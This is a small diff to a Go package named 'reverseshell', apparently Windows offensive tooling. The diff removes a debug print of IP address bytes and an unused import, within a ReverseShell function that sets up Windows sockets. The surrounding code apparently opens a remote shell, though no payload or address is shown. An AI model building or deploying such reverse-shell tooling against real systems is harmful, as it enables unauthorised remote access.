@@ -5,7 +5,6 @@ package reverseshell
 
 import (
 	"errors"
-	"fmt"
 	"strconv"
 	"strings"
 	"unsafe"
@@ -37,7 +36,6 @@ func ReverseShell(args []string) (string, error) {
 	}
 	var addr [4]byte
 	for i, bytee := range ip {
-		fmt.Println(bytee)
 		addr[i] = byte(bytee)
 	}
 	wsaData := &windows.WSAData{}
